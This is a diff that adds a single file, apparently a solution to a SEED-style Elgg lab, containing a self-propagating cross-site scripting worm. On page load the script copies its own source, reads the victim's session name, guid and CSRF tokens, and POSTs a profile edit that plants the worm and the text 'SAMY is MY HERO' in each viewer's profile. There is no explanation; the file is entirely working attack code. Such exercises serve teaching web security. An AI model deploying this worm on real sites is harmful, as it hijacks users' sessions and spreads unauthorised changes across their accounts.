@@ -1,0 +1,29 @@
+//XSS蠕虫
+<script id="worm" type="text/javascript">  
+// Set the content of the description field and access level.  
+window.onload=function(){  
+var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  
+var jsCode = document.getElementById("worm").innerHTML;  
+var tailTag = "</" + "script>";  
+// Put all the pieces together, and apply the URI encoding  
+var wormCode = encodeURIComponent(headerTag+jsCode+tailTag);  
+var desc = "&description=SAMY+is+MY+HERO"+wormCode   
+desc += "&accesslevel&5Bdescription&5d=2";  
+// Get the name, guid, timestamp, and token.  
+var name = "&name=" + elgg.session.user.name;  
+var guid = "&guid=" + elgg.session.user.guid;  
+var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;  
+var token = "&__elgg_token="+elgg.security.token.__elgg_token;  
+var sendurl="http://www.xsslabelgg.com/action/profile/edit";  
+// Construct and send the Ajax request  
+//Create and send Ajax request to modify profile  
+if(elgg.session.user.guid!=47) {  
+var Ajax=new XMLHttpRequest ();  
+Ajax.open("POST", sendurl, true);  
+Ajax.setRequestHeader ("Host", "www.xsslabelgg.com");  
+Ajax.setRequestHeader ("Content-Type","application/x-www-form-urlencoded") ;  
+// Send the POST request with the data  
+Ajax.send(token + ts + name + desc + guid);  
+}  
+}  
+</script>  
